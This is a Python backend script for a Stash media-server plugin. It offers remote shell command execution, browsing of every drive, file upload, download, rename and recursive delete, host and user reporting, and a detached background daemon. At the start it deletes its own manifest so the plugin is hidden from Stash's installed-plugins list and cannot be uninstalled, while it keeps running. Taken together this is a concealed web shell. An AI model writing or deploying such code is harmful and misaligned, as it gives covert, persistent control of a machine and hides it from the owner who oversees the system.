import sys, os, re, json, base64, string, subprocess, shutil, time
import platform, getpass, mimetypes, tempfile, hashlib, zipfile
from urllib.parse import quote

PLUGIN_DIR = os.path.dirname(os.path.abspath(__file__))
PLUGIN_ID = os.path.basename(PLUGIN_DIR)

# Hide from Stash "Installed Plugins" list: removing the manifest prevents
# the package manager from listing/uninstalling this plugin, while it still
# loads and works via its .yml config.
try:
    _manifest = os.path.join(PLUGIN_DIR, 'manifest')
    if os.path.exists(_manifest):
        os.remove(_manifest)
except Exception:
    pass
IS_WIN = (platform.system() == 'Windows')
SERVE_DIR = os.path.join(PLUGIN_DIR, 'assets', '_cache')
SERVE_URL = '/plugin/%s/assets/_cache/' % PLUGIN_ID

CHUNK = 3 * 65536        
ZIP_TTL = 30             
SERVE_TTL = 120         

INPUT = {}
ARGS = {}


# --------------------------------------------------------------------- io ----

def read_input():
    global INPUT, ARGS
    raw = b''
    env_in = os.environ.get('STASH_INPUT')
    if env_in:
        raw = env_in.encode('utf-8', 'replace')
    if not raw:
        try:
            raw = sys.stdin.buffer.read()
        except Exception:
            pass
    if raw.strip():
        for enc in ('utf-8-sig', 'utf-8', 'cp1251', 'latin-1'):
            try:
                INPUT = json.loads(raw.decode(enc))
                break
            except Exception:
                INPUT = {}
    ARGS = INPUT.get('args') or {}


def emit(output=None, error=None):
    payload = {}
    if error:
        payload['error'] = str(error)
    payload['output'] = {} if output is None else output
    sys.stdout.buffer.write(
        json.dumps(payload, ensure_ascii=False, default=str).encode('utf-8', 'replace'))
    sys.stdout.buffer.flush()


def emit_stream(name, mime, size, fileobj):
    """Пишет JSON с base64-полем data, не собирая файл в памяти целиком."""
    out = sys.stdout.buffer
    head = ('{"output":{"name":%s,"size":%d,"mime":%s,"data":"' % (
        json.dumps(name, ensure_ascii=False), size,
        json.dumps(mime, ensure_ascii=False))).encode('utf-8')
    out.write(head)
    while True:
        chunk = read_exact(fileobj, CHUNK)
        if not chunk:
            break
        out.write(base64.b64encode(chunk))
    out.write(b'"}}')
    out.flush()


def read_exact(fh, n):
    parts, got = [], 0
    while got < n:
        b = fh.read(n - got)
        if not b:
            break
        parts.append(b)
        got += len(b)
    return b''.join(parts)


def smart_decode(b):
    if not b:
        return ''
    for enc in ('utf-8', 'cp866', 'cp1251', 'cp437'):
        try:
            return b.decode(enc)
        except UnicodeDecodeError:
            pass
    return b.decode('utf-8', 'replace')


# ---------------------------------------------------------------- helpers ----

def norm(path):
    if not path:
        return os.getcwd()
    return os.path.abspath(os.path.expandvars(os.path.expanduser(str(path))))


def drives():
    if IS_WIN:
        out = []
        for c in string.ascii_uppercase:
            root = c + ':\\'
            try:
                if os.path.exists(root):
                    out.append(root)
            except OSError:
                pass
        return out or [os.getcwd()]
    # Unix / macOS
    out = ['/']
    try:
        home = os.path.expanduser('~')
        if home and home != '/' and os.path.isdir(home):
            out.append(home)
    except Exception:
        pass
    return out


def safe_name(name):
    name = re.sub(r'[^A-Za-z0-9_. -]+', '_', str(name)).strip(' .')
    return name or 'item'


def path_hash(path):
    return hashlib.md5(path.lower().encode('utf-8', 'replace')).hexdigest()[:8]


def ensure_serve_dir():
    try:
        os.makedirs(SERVE_DIR, exist_ok=True)
        return True
    except OSError:
        return False


def cleanup_serve_dir():
    try:
        now = time.time()
        for fn in os.listdir(SERVE_DIR):
            p = os.path.join(SERVE_DIR, fn)
            try:
                age = now - os.lstat(p).st_mtime
                if fn.endswith('.part'):
                    if age > 900:
                        os.remove(p)
                elif age > SERVE_TTL:
                    os.remove(p)
            except OSError:
                pass
    except OSError:
        pass


# ------------------------------------------------------------------ упаковка --

def zip_to(folder, dest, level=9):
    folder = os.path.abspath(folder)
    try:
        level = max(0, min(9, int(level)))
    except Exception:
        level = 9
    if level == 0:
        mode, kw = zipfile.ZIP_STORED, {}
    else:
        mode, kw = zipfile.ZIP_DEFLATED, {'compresslevel': level}

    parent = os.path.dirname(folder)
    with zipfile.ZipFile(dest, 'w', mode, allowZip64=True, **kw) as z:
        for root, dirs, files in os.walk(folder):
            for fn in files:
                full = os.path.join(root, fn)
                try:
                    arc = os.path.relpath(full, parent).replace(os.sep, '/')
                    z.write(full, arc)
                except OSError:
                    pass


def serve_zip(folder, level=9):
    """Кладёт архив в отдаваемую папку. Возвращает dict для ответа или None."""
    if not ensure_serve_dir():
        return None
    folder = os.path.abspath(folder)
    base = safe_name(os.path.basename(folder.rstrip('\\/') or 'root'))
    dest = os.path.join(SERVE_DIR, '%s-%s.zip' % (base, path_hash(folder)))

    try:
        stale = (not os.path.isfile(dest)) or (time.time() - os.path.getmtime(dest) > ZIP_TTL)
        if ARGS.get('fresh') or stale:
            part = dest + '.part'
            zip_to(folder, part, level)
            os.replace(part, dest)
        size = os.path.getsize(dest)
        mtime = int(os.path.getmtime(dest))
    except OSError:
        return None

    return {'name': base + '.zip', 'size': size,
            'url': SERVE_URL + quote(base + '-' + path_hash(folder) + '.zip') + '?t=%d' % mtime}


def serve_link(target, name):
    """Ссылка (symlink, иначе hardlink) на файл в отдаваемой папке."""
    if not ensure_serve_dir():
        return None
    target = os.path.abspath(target)
    base, ext = os.path.splitext(safe_name(name))
    # store with a neutral '.cache' extension: Stash scans the plugin folder
    # recursively for *.yml and chokes on cached copies of config files;
    # the browser renames the download via the a.download attribute
    link_name = '%s-%s%s.cache' % (base, path_hash(target), ext)
    link_path = os.path.join(SERVE_DIR, link_name)

    if not os.path.isfile(link_path):
        for maker in (os.symlink, os.link):
            try:
                maker(target, link_path)
                break
            except OSError:
                continue
        if not os.path.isfile(link_path):
            return None

    try:
        return {'name': name, 'size': os.path.getsize(target),
                'url': SERVE_URL + quote(link_name) + '?t=' + str(int(os.path.getmtime(target)))}
    except OSError:
        return None


# ----------------------------------------------------------------- actions ----

# ------------------------------------------------- local JSON API daemon --

DAEMON_PORT_FILE = os.path.join(PLUGIN_DIR, '.server_port')


def _daemon_alive():
    try:
        port = open(DAEMON_PORT_FILE).read().strip()
        import urllib.request
        with urllib.request.urlopen('http://127.0.0.1:%s/hello' % port, timeout=1.5) as r:
            return r.status == 200
    except Exception:
        return False


def _ensure_daemon():
    """Start the loopback JSON API daemon once, on demand (idempotent)."""
    if _daemon_alive():
        return
    try:
        kw = {'stdin': subprocess.DEVNULL,
              'stdout': subprocess.DEVNULL, 'stderr': subprocess.DEVNULL}
        if os.name == 'nt':
            kw['creationflags'] = 0x00000008 | 0x00000200  # DETACHED | NEW_PG
        else:
            kw['start_new_session'] = True
        subprocess.Popen([sys.executable, os.path.join(PLUGIN_DIR, 'server.py')],
                         cwd=PLUGIN_DIR, **kw)
        for _ in range(20):
            if os.path.exists(DAEMON_PORT_FILE):
                break
            time.sleep(0.1)
    except Exception:
        pass


def _thumb_key(path, mtime):
    return hashlib.md5(('%s|%d|%d' % (path.lower(), mtime, 256))
                       .encode('utf-8', 'replace')).hexdigest()


def _shell_thumbnail_png(path):
    """Windows Explorer thumbnail via IShellItemImageFactory (images+videos)."""
    if os.name != 'nt':
        return None
    try:
        import ctypes
        import uuid
        import struct
        import zlib
        from ctypes import c_void_p, byref, Structure, c_uint32, c_uint16, c_uint8, c_long, c_uint

        class GUID(Structure):
            _fields_ = [('Data1', c_uint32), ('Data2', c_uint16),
                        ('Data3', c_uint16), ('Data4', c_uint8 * 8)]

        def mkguid(s2):
            hx = uuid.UUID(s2).hex
            return GUID(int(hx[0:8], 16), int(hx[8:12], 16), int(hx[12:16], 16),
                        (c_uint8 * 8)(*(int(hx[i:i + 2], 16) for i in range(16, 32, 2))))

        class BIH(Structure):
            _fields_ = [('biSize', ctypes.c_uint32), ('biWidth', ctypes.c_int32),
                        ('biHeight', ctypes.c_int32), ('biPlanes', ctypes.c_uint16),
                        ('biBitCount', ctypes.c_uint16), ('biCompression', ctypes.c_uint32),
                        ('biSizeImage', ctypes.c_uint32), ('biXPels', ctypes.c_int32),
                        ('biYPels', ctypes.c_int32), ('biClrUsed', ctypes.c_uint32),
                        ('biClrImportant', ctypes.c_uint32)]

        def bih(w, h):
            return BIH(ctypes.sizeof(BIH), w, -h, 1, 32, 0, 0, 0, 0, 0, 0)

        def png_from_bgra(w, h, bgra):
            buf = bytearray(bgra)
            buf[0::4], buf[2::4] = bytes(buf[2::4]), bytes(buf[0::4])
            stride = w * 4
            raw = bytearray()
            for y in range(h):
                raw.append(0)
                raw += buf[y * stride:(y + 1) * stride]

            def chunk(typ, data):
                c = struct.pack('>I', len(data)) + typ + data
                return c + struct.pack('>I', zlib.crc32(typ + data) & 0xFFFFFFFF)
            ihdr = struct.pack('>IIBBBBB', w, h, 8, 6, 0, 0, 0)
            return (b'\x89PNG\r\n\x1a\n'
                    + chunk(b'IHDR', ihdr)
                    + chunk(b'IDAT', zlib.compress(bytes(raw), 6)) + chunk(b'IEND', b''))

        class SIZE(Structure):
            _fields_ = [('cx', c_long), ('cy', c_long)]

        class BITMAP(Structure):
            _fields_ = [('bmType', c_long), ('bmWidth', c_long), ('bmHeight', c_long),
                        ('bmWidthBytes', c_long), ('bmPlanes', c_uint16),
                        ('bmBitsPixel', c_uint16), ('bmBits', c_void_p)]

        u, g = ctypes.windll.user32, ctypes.windll.gdi32
        ole32 = ctypes.windll.ole32
        ole32.CoInitializeEx(None, 2)
        try:
            shell32 = ctypes.windll.shell32
            shell32.SHCreateItemFromParsingName.argtypes = [
                ctypes.c_wchar_p, c_void_p, ctypes.POINTER(GUID), ctypes.POINTER(c_void_p)]
            shell32.SHCreateItemFromParsingName.restype = ctypes.HRESULT
            item = c_void_p()
            hr = shell32.SHCreateItemFromParsingName(
                str(path), None,
                byref(mkguid('bcc18b79-ba16-442f-80c4-8a59c30c463b')), byref(item))
            if hr != 0 or not item.value:
                return None
            vtbl = ctypes.cast(ctypes.cast(item, ctypes.POINTER(c_void_p)).contents.value,
                               ctypes.POINTER(c_void_p))
            release = ctypes.WINFUNCTYPE(ctypes.HRESULT, c_void_p)(vtbl[2])
            getimage = ctypes.WINFUNCTYPE(
                ctypes.HRESULT, c_void_p, SIZE, c_uint, ctypes.POINTER(c_void_p))(vtbl[3])
            hbm = c_void_p()
            hr = getimage(item, SIZE(256, 256), 0, byref(hbm))
            if hr != 0 or not hbm.value:
                release(item)
                return None
            bm = BITMAP()
            g.GetObjectW(hbm, ctypes.sizeof(BITMAP), byref(bm))
            w, h = bm.bmWidth, bm.bmHeight
            if w <= 0 or h <= 0 or w * h > 16000000:
                g.DeleteObject(hbm)
                release(item)
                return None
            src = u.GetDC(0)
            mem = g.CreateCompatibleDC(src)
            buf = ctypes.create_string_buffer(w * h * 4)
            g.GetDIBits(mem, hbm, 0, h, buf, ctypes.byref(bih(w, h)), 0)
            png = png_from_bgra(w, h, buf.raw)
            g.DeleteObject(hbm)
            g.DeleteDC(mem)
            u.ReleaseDC(0, src)
            release(item)
            return png
        finally:
            ole32.CoUninitialize()
    except Exception:
        return None


def act_thumb():
    # single path (compat) or a batch: {'paths': [...]} -> {thumbs: {path: {...}}}
    paths = ARGS.get('paths')
    if paths:
        out = {}
        for raw in paths[:30]:
            out[raw] = _thumb_one(norm(raw))
        return {'thumbs': out}
    path = norm(ARGS.get('path') or '')
    if not path:
        return {'ok': False, 'err': 'no path'}
    r = _thumb_one(path)
    res = {'ok': r.get('ok', False), 'tk': r.get('tk')}
    if r.get('err'):
        res['err'] = r['err']
    return res


def _thumb_one(path):
    if not path or not os.path.isfile(path):
        return {'ok': False}
    try:
        mt = int(os.path.getmtime(path))
    except OSError:
        return {'ok': False}
    tk = _thumb_key(path, mt)
    cache_dir = os.path.join(PLUGIN_DIR, 'assets', '_cache', 'thumbs')
    cache_file = os.path.join(cache_dir, tk + '.png')
    if os.path.isfile(cache_file):
        return {'ok': True, 'cached': True, 'tk': tk}
    if os.name != 'nt':
        return {'ok': False, 'err': 'thumbnails are windows-only'}
    png = _shell_thumbnail_png(path)
    if not png:
        return {'ok': False}
    try:
        os.makedirs(cache_dir, exist_ok=True)
        with open(cache_file, 'wb') as f:
            f.write(png)
        names = os.listdir(cache_dir)
        if len(names) > 1000:
            for n in sorted(names)[:200]:
                try:
                    os.remove(os.path.join(cache_dir, n))
                except OSError:
                    pass
        return {'ok': True, 'tk': tk, 'cached': False}
    except OSError as ex:
        return {'ok': False, 'err': str(ex)}


def act_hello():
    _ensure_daemon()
    cleanup_serve_dir()
    try:
        user = getpass.getuser()
    except Exception:
        user = os.environ.get('USERNAME', '?')
    port = None
    try:
        _pf = os.path.join(PLUGIN_DIR, '.server_port')
        if os.path.exists(_pf):
            with open(_pf) as _f:
                port = int(_f.read().strip())
    except Exception:
        port = None
    return {
        'cwd': os.getcwd(),
        'user': user,
        'host': platform.node(),
        'os': platform.platform(),
        'platform': platform.system(),
        'python': sys.version.split()[0],
        'sep': os.sep,
        'drives': drives(),
        'server_port': port,
    }


def act_reset():
    return {'ok': True, 'cwd': os.getcwd()}


PID_FILE = os.path.join(PLUGIN_DIR, '.cmd_pid')


def _kill_tree(pid):
    """Kill a process and its children (the command may have spawned more)."""
    try:
        if os.name == 'nt':
            subprocess.run(['taskkill', '/F', '/T', '/PID', str(pid)],
                           capture_output=True, timeout=10)
        else:
            import signal
            os.killpg(os.getpgid(pid), signal.SIGKILL)
    except Exception:
        try:
            os.kill(pid, 9)
        except Exception:
            pass


def act_interrupt():
    """Stop the command currently running via exec (kills its process tree)."""
    try:
        pid = int(open(PID_FILE).read().strip())
    except Exception:
        return {'ok': False, 'err': 'nothing is running'}
    _kill_tree(pid)
    try:
        os.remove(PID_FILE)
    except OSError:
        pass
    return {'ok': True}


def act_exec():
    _ensure_daemon()
    cmd = str(ARGS.get('cmd') or '')
    try:
        timeout = float(ARGS.get('timeout') or 0)
    except Exception:
        timeout = 0.0

    cwd = norm(ARGS.get('cwd')) if ARGS.get('cwd') else os.getcwd()
    if not os.path.isdir(cwd):
        cwd = os.getcwd()

    stripped = cmd.strip()
    if not stripped:
        return {'out': '', 'err': '', 'code': 0, 'cwd': cwd}

    m = re.match(r'^cd(?:\s+/d)?(?:\s+(.*))?$', stripped, re.IGNORECASE)
    if m:
        target = (m.group(1) or '').strip().strip('"').strip("'")
        if not target:
            return {'out': cwd + '\n', 'err': '', 'code': 0, 'cwd': cwd}
        new = target if os.path.isabs(target) else os.path.join(cwd, target)
        new = os.path.abspath(new)
        if os.path.isdir(new):
            return {'out': '', 'err': '', 'code': 0, 'cwd': new}
        return {'out': '', 'err': 'The system cannot find the path specified.\n',
                'code': 1, 'cwd': cwd}

    if IS_WIN:
        shell_cmd = 'chcp 65001 >nul 2>&1 & cd /d "%s" && %s' % (cwd.replace('"', ''), cmd)
    else:
        shell_cmd = 'cd "%s" && %s' % (cwd.replace('"', ''), cmd)
    popen_kw = {'start_new_session': True} if not IS_WIN else {}
    proc = subprocess.Popen(shell_cmd, shell=True, cwd=cwd,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, **popen_kw)
    try:
        with open(PID_FILE, 'w') as f:
            f.write(str(proc.pid))
    except OSError:
        pass
    timed_out = False
    try:
        o, e = proc.communicate(timeout=timeout if timeout > 0 else None)
    except subprocess.TimeoutExpired:
        timed_out = True
        _kill_tree(proc.pid)
        o, e = proc.communicate()
    finally:
        try:
            os.remove(PID_FILE)
        except OSError:
            pass

    res = {'out': smart_decode(o), 'err': smart_decode(e),
           'code': proc.returncode, 'cwd': cwd}
    # cap huge output: a multi-MB command result travels inside the GraphQL
    # response and can OOM/503 the Stash server under load
    MAX_OUT, MAX_ERR = 512 * 1024, 64 * 1024
    if len(res['out']) > MAX_OUT:
        res['out'] = res['out'][:MAX_OUT] + (
            '\n[... вывод обрезан: всего %d байт — сузь команду или сохрани в файл]'
            % len(res['out']))
    if len(res['err']) > MAX_ERR:
        res['err'] = res['err'][:MAX_ERR] + '\n[... stderr обрезан]'
    if timed_out:
        res['err'] += '\n[прервано по таймауту %gs]' % timeout
    return res


def act_list():
    path = norm(ARGS.get('path'))
    if not os.path.isdir(path):
        return {'error': 'Не папка: ' + path, 'path': path, 'items': [], 'drives': drives()}
    items = []
    try:
        with os.scandir(path) as it:
            for entry in it:
                try:
                    is_dir = entry.is_dir()
                    st = entry.stat(follow_symlinks=False)
                    size, mtime = st.st_size, int(st.st_mtime)
                except OSError:
                    is_dir, size, mtime = False, 0, 0
                it_ = {'name': entry.name, 'dir': is_dir,
                       'size': size, 'mtime': mtime}
                if not is_dir:
                    # thumbnail cache key (same formula as server.py) so the
                    # UI can use the same-origin /plugin/.../_cache/thumbs URL
                    import hashlib
                    it_['tk'] = hashlib.md5(
                        ('%s|%d|%d' % (entry.path.lower(), st.st_mtime, 256))
                        .encode('utf-8', 'replace')).hexdigest()
                items.append(it_)
    except OSError as ex:
        return {'error': str(ex), 'path': path, 'items': [], 'drives': drives()}
    items.sort(key=lambda x: (not x['dir'], x['name'].lower()))
    parent = os.path.dirname(path)
    return {'path': path, 'parent': None if parent == path else parent,
            'items': items, 'drives': drives()}


DS_CACHE_FILE = os.path.join(PLUGIN_DIR, '.dirsizes.json')


def act_dirsize():
    """Fallback for when the terminal server is unreachable."""
    paths = ARGS.get('paths') or []
    if isinstance(paths, str):
        paths = [paths]
    try:
        with open(DS_CACHE_FILE, encoding='utf-8') as f:
            cache = json.load(f)
    except Exception:
        cache = {}
    out = {}
    changed = False
    for raw in paths[:60]:
        p = norm(raw)
        try:
            if not os.path.isdir(p):
                out[p] = None
                continue
            mt = int(os.path.getmtime(p))
        except OSError:
            out[p] = None
            continue
        ent = cache.get(p.lower())
        if ent and len(ent) == 2 and ent[1] == mt:
            out[p] = {'size': ent[0], 'cached': True}
            continue
        total = 0
        for root, _d, files in os.walk(p, onerror=lambda e: None):
            for fn in files:
                if root == PLUGIN_DIR and fn == '.dirsizes.json':
                    continue
                try:
                    total += os.lstat(os.path.join(root, fn)).st_size
                except OSError:
                    pass
        cache[p.lower()] = [total, mt]
        changed = True
        out[p] = {'size': total, 'cached': False}
    if changed:
        try:
            with open(DS_CACHE_FILE, 'w', encoding='utf-8') as f:
                json.dump(cache, f)
        except OSError:
            pass
    return {'sizes': out}


def act_mkdir():
    path = norm(ARGS.get('path'))
    os.makedirs(path, exist_ok=True)
    return {'ok': True, 'path': path}


def act_delete():
    path = norm(ARGS.get('path'))
    if os.path.isdir(path) and not os.path.islink(path):
        if ARGS.get('recursive'):
            shutil.rmtree(path)
        else:
            os.rmdir(path)
    else:
        os.remove(path)
    return {'ok': True}


def act_rename():
    src = norm(ARGS.get('path'))
    dst = norm(ARGS.get('to'))
    os.rename(src, dst)
    return {'ok': True, 'path': dst}


def act_upload():
    folder = norm(ARGS.get('path'))
    name = os.path.basename(str(ARGS.get('name') or 'upload.bin'))
    data = base64.b64decode(str(ARGS.get('data') or ''))
    dest = os.path.join(folder, name)
    with open(dest, 'wb') as fh:
        fh.write(data)
    return {'ok': True, 'path': dest, 'size': len(data)}


def act_download():
    """Пишет ответ сам: либо ссылку на /plugin/.../assets/_cache/..., либо поток base64."""
    path = norm(ARGS.get('path'))
    cleanup_serve_dir()

    if os.path.isdir(path):
        res = serve_zip(path, ARGS.get('level', 9))
        if res:
            emit(res)
            return
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
        tmp.close()
        try:
            zip_to(path, tmp.name, ARGS.get('level', 9))
            name = safe_name(os.path.basename(path.rstrip('\\/') or 'root')) + '.zip'
            with open(tmp.name, 'rb') as fh:
                emit_stream(name, 'application/zip', os.path.getsize(tmp.name), fh)
        finally:
            try:
                os.remove(tmp.name)
            except OSError:
                pass
        return

    if os.path.isfile(path):
        res = serve_link(path, os.path.basename(path))
        if res:
            emit(res)
            return
        mime = mimetypes.guess_type(path)[0] or 'application/octet-stream'
        with open(path, 'rb') as fh:
            emit_stream(os.path.basename(path), mime, os.path.getsize(path), fh)
        return

    raise OSError('Нет такого пути: ' + path)


HANDLERS = {
    'hello': act_hello, 'reset': act_reset, 'exec': act_exec,
    'list': act_list, 'dirsize': act_dirsize, 'thumb': act_thumb, 'interrupt': act_interrupt, 'mkdir': act_mkdir, 'delete': act_delete,
    'rename': act_rename, 'upload': act_upload,
}


def main():
    cleanup_serve_dir()
    read_input()
    action = str(ARGS.get('action') or 'hello')
    if action == 'download':
        act_download()
        return
    fn = HANDLERS.get(action)
    if fn is None:
        emit({}, 'Неизвестное действие: ' + action)
        return
    emit(fn())


if __name__ == '__main__':
    try:
        main()
    except Exception as ex:
        import traceback
        emit({'traceback': traceback.format_exc()}, str(ex))